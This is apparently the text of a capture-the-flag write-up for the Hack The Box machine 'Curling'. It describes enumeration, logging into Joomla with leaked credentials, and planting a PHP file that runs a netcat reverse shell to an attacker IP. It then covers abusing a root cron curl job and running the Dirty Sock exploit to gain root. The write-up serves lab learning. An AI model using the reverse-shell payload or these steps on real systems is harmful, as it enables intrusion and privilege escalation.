<meta name="description" content="Quick Summary Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is 10.10.10.150 I added it to /etc/hosts as curling.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC curling.htb We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http. HTTP Initial Enumeration We see a blog titled “Cewl Curling site!” , and it’s joomla. At this point I would run joomscan but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment : So I checked /secret.txt and found this base64 string : Decoding : Curling2018! we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts : We will notice a name in one of the posts : Floris , now we can try to login as floris with the password Curling2018! : And it worked. While I was doing this enumeration I ran gobuster in the background and got these results : /.htpasswd (Status: 403) /.hta (Status: 403) /administrator (Status: 301) /.htaccess (Status: 403) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) Let’s go to /administrator and login to the administration panel : Editing Template Files and Getting a Reverse Shell : On the configuration section there’s an option for templates : By going to that we notice that protostar is the default style and template : From templates we will go to Protostar Details and Files and create a new php file : In the php file we will execute a system command to get a reverse shell : &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f&#39;); ?&gt; After we save the file we will go to http://curling.htb/templates/protostar/file.php Then we check our listener : User We got a reverse shell as www-data , in the /home directory there’s a directory for floris : We don’t have read access to user.txt , but we notice a file called password_backup , by looking at that file : It’s a hex dump file , So I copied it to my box to reverse it : To reverse a hex dump file we will use xxd , so xxd -r pw_backup : Not a normal output , let’s redirect the output to a file and see : So what happened is , it turned out to be a bzip2 file so I decompressed it then got a new gzip file , decompressed it and got another bzip2 file , after decompression I got a tar file , then finally a txt file for the password : Let’s ssh as floris : And we owned user ! Curling By looking at the /home directory of floris again : There’s a directory called admin-area which contains two files : input and report input : url = &quot;http://127.0.0.1&quot; report : It’s obvious that this is the output of executing curl on http://127.0.0.1 : Even the name of the box is a hint curling , so what about changing that url from localhost to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe root.txt ? But only if it’s getting executed by root. Let’s try and see if it will work : Then we will do : watch cat report , this is executing cat report every 2 seconds and giving us the output , easier than checking manually : After some time we get the flag. Dirty Sock ? Root shell ! I didn’t like the fact that I could only read the flag , I wanted a root shell. So I tried for a long time to bypass the url thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an ubuntu box , so I checked snap version to know if it’s vulnerable to CVE-2019-7304 known as Dirty Sock and of course it was : This is not intended at all because by the time this box was released , CVE-2019-7304 wasn’t disclosed yet. I got the exploit from here , Then hosted it on a python simple http server and downloaded it on the box : python3 dirty_sockv2.py Now we can su to dirty_sock and execute commands as root : Or just sudo su and we will get a root shell : We owned root !
